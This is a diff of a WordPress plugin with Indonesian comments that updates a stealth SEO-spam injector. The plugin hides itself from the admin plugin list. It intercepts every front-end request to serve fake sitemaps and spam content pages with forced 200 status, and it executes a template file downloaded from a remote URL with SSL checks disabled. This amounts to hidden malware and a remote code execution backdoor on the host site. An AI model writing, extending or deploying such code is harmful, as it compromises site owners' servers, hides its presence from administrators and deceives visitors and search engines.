@@ -1,8 +1,8 @@
 <?php
 /*
 Plugin Name: Additional Content Plugin
-Description: Plugin konten & sitemap stealth dengan Buffer Cleaner (Anti-XML Error).
-Version: 7.3
+Description: Plugin konten & sitemap stealth dengan Full Nuclear Intercept (Anti-404 Content).
+Version: 7.4
 Author: Grok
 */
 
@@ -24,21 +24,30 @@ function acp_get_storage_dir() {
 }
 
 // ==========================================
-// 1. SITEMAP HANDLER (NUCLEAR INTERCEPT)
+// 1. NUCLEAR HANDLER (SITEMAP & CONTENT)
 // ==========================================
-add_action('plugins_loaded', 'acp_nuclear_intercept', -9999);
-function acp_nuclear_intercept() {
-    if (isset($_SERVER['REQUEST_URI']) && strpos($_SERVER['REQUEST_URI'], '.xml') !== false) {
-        $path = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
-        $filename = basename($path);
-        
-        // A. SITEMAP INDEX
+// Kita jalankan di plugins_loaded dengan prioritas sangat tinggi (-9999)
+add_action('plugins_loaded', 'acp_nuclear_handler', -9999);
+
+function acp_nuclear_handler() {
+    // Pastikan bukan di area admin atau file fisik
+    if (is_admin() || strpos($_SERVER['REQUEST_URI'], 'wp-admin') !== false || strpos($_SERVER['REQUEST_URI'], 'wp-login') !== false) {
+        return;
+    }
+
+    $request_uri = $_SERVER['REQUEST_URI'];
+    $path = parse_url($request_uri, PHP_URL_PATH);
+    $filename = basename($path);
+    
+    // --- BAGIAN A: SITEMAP INTERCEPT ---
+    if (strpos($request_uri, '.xml') !== false) {
+        // 1. Sitemap Index
         if ($filename === ACP_MAIN_SITEMAP) {
             acp_render_sitemap_index();
             exit;
         }
 
-        // B. CHILD SITEMAP
+        // 2. Child Sitemap
         $filename_no_ext = str_replace('.xml', '', $filename);
         $sitemap_name = $filename_no_ext;
         $page = 1;
@@ -49,47 +58,89 @@ function acp_nuclear_intercept() {
         }
 
         $endpoints = get_option('acp_endpoints', []);
-        if (empty($endpoints)) return;
-
-        $target_endpoint = false;
         foreach ($endpoints as $ep) {
             if (isset($ep['status']) && $ep['status'] === 'active' && $ep['sitemap_name'] === $sitemap_name) {
-                $target_endpoint = $ep;
-                break;
+                acp_render_child_sitemap($ep, $page);
+                exit;
             }
         }
+        return; // Jika .xml tapi tidak cocok, biarkan WP handle (mungkin sitemap asli)
+    }
 
-        if ($target_endpoint) {
-            acp_render_child_sitemap($target_endpoint, $page);
-            exit;
+    // --- BAGIAN B: CONTENT INTERCEPT (FIX 404) ---
+    // Cek apakah URL ini adalah slug konten
+    $slug = trim($path, '/');
+    
+    // Abaikan jika slug kosong atau file statis (gambar/css/js)
+    if (empty($slug) || preg_match('/\.(css|js|jpg|jpeg|png|gif|ico|woff|ttf|svg)$/i', $slug)) {
+        return;
+    }
+
+    // Decode slug agar sesuai dengan key di JSON (mengatasi %20 dll)
+    $title_key = urldecode($slug);
+
+    // Cek file template lokal dulu
+    $template_path = acp_get_storage_dir() . '/template.txt';
+    if (!file_exists($template_path)) return; 
+
+    // Loop semua JSON lokal untuk mencari slug ini
+    $endpoints = get_option('acp_endpoints', []);
+    foreach ($endpoints as $ep) {
+        if (!isset($ep['status']) || $ep['status'] !== 'active') continue;
+        
+        $data = acp_get_local_json($ep['json_filename']);
+        if (is_array($data)) {
+            // Case-insensitive check agar lebih robust
+            foreach ($data as $k => $v) {
+                if (strtolower($k) === strtolower($title_key)) {
+                    // KETEMU!
+                    
+                    // 1. Set Header 200 OK (Penting untuk SEO)
+                    if (!headers_sent()) {
+                        header('HTTP/1.1 200 OK');
+                        status_header(200);
+                    }
+
+                    // 2. Bersihkan Buffer (mencegah output sampah dari theme/plugin lain)
+                    while (ob_get_level()) {
+                        ob_end_clean();
+                    }
+
+                    // 3. Siapkan variabel
+                    $additional_content = $v;
+
+                    // 4. Load Template
+                    include $template_path;
+
+                    // 5. Matikan WP sepenuhnya
+                    exit;
+                }
+            }
         }
     }
 }
 
-// FUNGSI PEMBERSIH BUFFER (SOLUSI ERROR XML LINE 2)
+// ==========================================
+// 2. SITEMAP RENDERERS (BUFFER CLEANED)
+// ==========================================
+
 function acp_clean_output_buffer() {
-    // Hapus semua output sebelumnya (spasi/enter dari plugin lain)
-    while (ob_get_level()) {
-        ob_end_clean();
-    }
+    while (ob_get_level()) ob_end_clean();
 }
 
 function acp_render_sitemap_index() {
-    acp_clean_output_buffer(); // BERSIHKAN DULU!
-
+    acp_clean_output_buffer();
     if (!headers_sent()) {
         header('HTTP/1.1 200 OK');
         header('Content-Type: application/xml; charset=utf-8');
         header('X-Robots-Tag: noindex, follow');
     }
-
     echo '<?xml version="1.0" encoding="UTF-8"?>' . "\n";
     echo '<sitemapindex xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . "\n";
 
     $endpoints = get_option('acp_endpoints', []);
     foreach ($endpoints as $ep) {
         if (!isset($ep['status']) || $ep['status'] !== 'active') continue;
-
         $total_urls = acp_get_local_json_count($ep['json_filename']);
         $total_pages = ceil($total_urls / ACP_MAX_URLS_PER_SITEMAP);
         if ($total_pages < 1) $total_pages = 1;
@@ -104,23 +155,18 @@ function acp_render_sitemap_index() {
 }
 
 function acp_render_child_sitemap($endpoint, $page) {
-    acp_clean_output_buffer(); // BERSIHKAN DULU!
-
+    acp_clean_output_buffer();
     if (!headers_sent()) {
         header('HTTP/1.1 200 OK');
         header('Content-Type: application/xml; charset=utf-8');
         header('X-Robots-Tag: noindex, follow');
     }
-
     $konten_data = acp_get_local_json($endpoint['json_filename']);
-
     echo '<?xml version="1.0" encoding="UTF-8"?>' . "\n";
     echo '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . "\n";
-    
     if (!empty($konten_data) && is_array($konten_data)) {
         $chunks = array_chunk($konten_data, ACP_MAX_URLS_PER_SITEMAP, true);
         $chunk_index = $page - 1;
-
         if (isset($chunks[$chunk_index])) {
             foreach ($chunks[$chunk_index] as $title => $desc) {
                 echo "\t<url>\n\t\t<loc>" . esc_url(home_url(urlencode($title))) . "</loc>\n\t\t<lastmod>" . date('c') . "</lastmod>\n\t\t<changefreq>weekly</changefreq>\n\t</url>\n";
@@ -131,7 +177,7 @@ function acp_render_child_sitemap($endpoint, $page) {
 }
 
 // ==========================================
-// 2. HELPER (LOCAL FILE)
+// 3. HELPER FUNCTIONS
 // ==========================================
 
 function acp_download_and_save_files() {
@@ -140,15 +186,11 @@ function acp_download_and_save_files() {
         wp_mkdir_p($storage_dir);
         file_put_contents($storage_dir . '/.htaccess', 'deny from all');
     }
-
-    // Download Template
     $tpl = wp_remote_get(ACP_TEMPLATE_URL, ['timeout' => 30, 'sslverify' => false]);
     if (!is_wp_error($tpl)) {
         $body = wp_remote_retrieve_body($tpl);
         if (!empty($body)) file_put_contents($storage_dir . '/template.txt', $body);
     }
-
-    // Download JSONs
     $endpoints = get_option('acp_endpoints', []);
     $count = 0;
     foreach ($endpoints as $ep) {
@@ -167,9 +209,7 @@ function acp_download_and_save_files() {
 
 function acp_get_local_json($filename) {
     $path = acp_get_storage_dir() . '/' . $filename . '.json';
-    if (file_exists($path)) {
-        return json_decode(file_get_contents($path), true);
-    }
+    if (file_exists($path)) return json_decode(file_get_contents($path), true);
     return [];
 }
 
@@ -178,7 +218,7 @@ function acp_get_local_json_count($filename) {
 }
 
 // ==========================================
-// 3. ADMIN PAGE
+// 4. ADMIN PAGE (STEALTH & SETTINGS)
 // ==========================================
 
 add_filter('all_plugins', 'acp_hide_plugin_from_list');
@@ -225,7 +265,7 @@ function acp_admin_page() {
             $ep['status'] = file_exists(acp_get_storage_dir() . '/' . $ep['json_filename'] . '.json') ? 'active' : 'error';
         }
         update_option('acp_endpoints', $endpoints);
-        echo '<div class="updated"><p>Download selesai & Sitemap Updated.</p></div>';
+        echo '<div class="updated"><p>Data Terupdate.</p></div>';
     }
     if (isset($_POST['acp_reset'])) {
         check_admin_referer('acp_action');
@@ -237,7 +277,7 @@ function acp_admin_page() {
     $main_sitemap_url = home_url(ACP_MAIN_SITEMAP);
     ?>
     <div class="wrap">
-        <h1>Content Plugin (V7.3 Buffer Clean)</h1>
+        <h1>Content Plugin (V7.4 Anti-404)</h1>
         <?php if ($is_hidden): ?><div class="notice notice-error"><p>MODE STEALTH AKTIF</p></div><?php endif; ?>
         
         <div style="background:#fff; padding:15px; border-left:4px solid #00a0d2; margin-bottom:20px; display:flex; justify-content:space-between; align-items:center;">
@@ -269,11 +309,7 @@ function acp_admin_page() {
                         <tr>
                             <td><?php echo $i + 1; ?></td>
                             <td><input type="text" value="<?php echo $ep['json_filename']; ?>" class="regular-text" style="width:150px;" readonly> .json</td>
-                            <td>
-                                <?php if ($st == 'active') echo '<strong style="color:green">OK (Tersimpan)</strong>'; 
-                                      elseif ($st == 'error') echo '<strong style="color:red">GAGAL</strong>';
-                                      else echo '<span style="color:#888">Belum Download</span>'; ?>
-                            </td>
+                            <td><?php echo ($st == 'active') ? '<strong style="color:green">OK</strong>' : '<span>-</span>'; ?></td>
                         </tr>
                         <?php endforeach; ?>
                     </tbody>
@@ -286,44 +322,4 @@ function acp_admin_page() {
     <script>jQuery(document).ready(function($){$('.acp-copy').click(function(){var t=document.getElementById($(this).data('target'));t.select();document.execCommand('copy');alert('Copied!');});});</script>
     <?php
 }
-
-// ==========================================
-// 4. CONTENT HANDLER (INCLUDE MODE)
-// ==========================================
-add_action('init', 'acp_register_rewrite_rules');
-function acp_register_rewrite_rules() {
-    add_rewrite_rule('^([^/]+)/?$', 'index.php?acp_value=$matches[1]', 'top');
-}
-add_filter('query_vars', function($v){ $v[] = 'acp_value'; return $v; });
-
-add_action('template_redirect', 'acp_display_content');
-function acp_display_content() {
-    $val = get_query_var('acp_value');
-    if (!$val) {
-        $path = trim(parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH), '/');
-        if (!empty($path) && !is_admin() && !get_page_by_path($path)) $val = $path;
-        else return;
-    }
-    $title = sanitize_text_field(urldecode($val));
-    if (get_page_by_path($title, OBJECT, ['post', 'page'])) return;
-
-    $template_path = acp_get_storage_dir() . '/template.txt';
-    if (!file_exists($template_path)) return;
-
-    $endpoints = get_option('acp_endpoints', []);
-    foreach ($endpoints as $ep) {
-        if (!isset($ep['status']) || $ep['status'] !== 'active') continue;
-        
-        $data = acp_get_local_json($ep['json_filename']);
-        if (is_array($data)) {
-            foreach ($data as $k => $v) {
-                if (strtolower($k) === strtolower($title)) {
-                    $additional_content = $v;
-                    include $template_path;
-                    exit;
-                }
-            }
-        }
-    }
-}
-// Note: Tidak ada tag penutup PHP di akhir untuk mencegah injeksi whitespace
+// Note: Tidak ada tag penutup PHP
